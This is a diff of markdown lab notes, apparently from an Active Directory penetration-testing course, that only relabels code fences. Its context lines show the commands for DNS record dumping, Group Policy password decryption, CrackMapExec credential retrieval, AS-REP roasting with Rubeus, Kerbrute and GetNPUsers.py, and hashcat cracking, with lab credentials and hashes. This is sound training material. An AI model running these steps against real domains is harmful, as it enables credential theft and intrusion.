@@ -52,7 +52,7 @@ On the first run of the tool, we can see that some records are blank, namely `?,
 
 ### Using adidnsdump
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 
 
 Password: 
@@ -67,7 +67,7 @@ Password:
 
 ### Viewing the Contents of the records.csv File
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ head records.csv 
 
 type,name,value
@@ -86,7 +86,7 @@ If we run again with the `-r` flag the tool will attempt to resolve unknown reco
 
 ### Using the -r Option to Resolve Unknown Records
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
 
 Password: 
@@ -100,7 +100,7 @@ Password:
 
 ### Finding Hidden Records in the records.csv File
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ head records.csv 
 
 type,name,value
@@ -207,7 +207,7 @@ These files can contain an array of configuration data and defined passwords. Th
 ### Decrypting the Password with gpp-decrypt
 If you retrieve the cpassword value more manually, the gpp-decrypt utility can be used to decrypt the password as follows:
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
 
 Password1
@@ -215,7 +215,7 @@ Password1
 
 ### Locating & Retrieving GPP Passwords with CrackMapExec
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ crackmapexec smb -L | grep gpp
 
 [*] gpp_autologin             Searches the domain controller for registry.xml to find autologon information and returns the username and password.
@@ -225,7 +225,7 @@ masterofblafu@htb[/htb]$ crackmapexec smb -L | grep gpp
 ### Using CrackMapExec's gpp_autologin Module
 It is also possible to find passwords in files such as Registry.xml when autologon is configured via Group Policy. This may be set up for any number of reasons for a machine to automatically log in at boot. If this is set via Group Policy and not locally on the host, then anyone on the domain can retrieve credentials stored in the Registry.xml file created for this purpose. 
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
 
 SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
@@ -296,7 +296,7 @@ PS C:\htb> .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
 
 ### Cracking the Hash Offline with Hashcat
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt 
 
 hashcat (v6.1.1) starting...
@@ -328,7 +328,7 @@ Stopped: Fri Apr  1 13:18:55 2022
 ### Retrieving the AS-REP Using Kerbrute
 When performing user enumeration with `Kerbrute`, the tool will automatically retrieve the AS-REP for any users found that do not require Kerberos pre-authentication.
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
 
     __             __               __     
@@ -360,7 +360,7 @@ $krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:400d306dda575be3d429aad39ec68a33$8698e
 ### Hunting for Users with Kerberos Pre-auth Not Required
 With a list of valid users, we can use Get-NPUsers.py from the Impacket toolkit to hunt for all users with Kerberos pre-authentication not required. The tool will retrieve the AS-REP in Hashcat format for offline cracking for any found. We can also feed a wordlist such as jsmith.txt into the tool, it will throw errors for users that do not exist, but if it finds any valid ones without Kerberos pre-authentication, then it can be a nice way to obtain a foothold or further our access, depending on where we are in the course of our assessment. 
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users 
 Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
 
@@ -554,7 +554,7 @@ RDP to **10.129.47.232** (ACADEMY-EA-MS01),**10.129.50.234** (ACADEMY-EA-ATTACK0
             $krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:DEF689B80048F3ACECCC0136296AC8DC$6D9FA388D2BD4064446BB526C2C54CEDC13C3BFEF588D23D3C1C2E239D3F15B6AECA5CA5A237B69F807F7D15AE6BC57FDE0D1DFA48073E55F3D5E70EE526E5802436F330A6337BCDE79D7BFE480382BCA4D4B4F81E0BAA6A3C200DAF702293FD55895A20A12C15FF0F070E70F54F0148B9EF9193070DCE26A5CCD3EE3054EB02C02184F039A79C153C2F245C6462E0A0CB6AB428914211EAC6AD755BC8A06DDCAF58090BC66845315AA159E07D7E5A61F30EC9138F26C14F63E2C04DF956D63AA0B4D45230E9FD773D0C72068E800C73503502EDD7DDF6DA7306B9238546438B33B6FA0CEF21B74F9146238766B1846E5468F9F5EB9271F7AE96
         ```
    - Crack it offline with hashcat mode 18200:
-        ```sh
+        ```shellsession
         $ hashcat -m 18200 as_rep /usr/share/wordlists/rockyou.txt 
 
         <SNIP>
